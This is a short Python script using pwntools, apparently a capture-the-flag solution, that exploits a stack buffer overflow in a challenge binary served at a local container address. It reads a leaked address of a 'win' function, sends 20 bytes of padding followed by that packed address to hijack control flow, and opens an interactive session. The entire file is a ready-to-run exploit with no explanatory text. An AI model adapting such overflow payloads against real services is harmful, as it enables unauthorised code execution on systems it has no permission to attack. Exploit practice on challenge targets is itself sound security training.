from pwn import process, remote
import struct
import sys

#target = process("./zero.o")
target = remote("172.17.0.2", 10000)

addr = int(target.recvuntil("win!").split()[2].decode("utf-8"), 16)

padding = b'\x41'*20
payload = padding + struct.pack("<L", addr)

target.sendline(payload)
target.interactive()

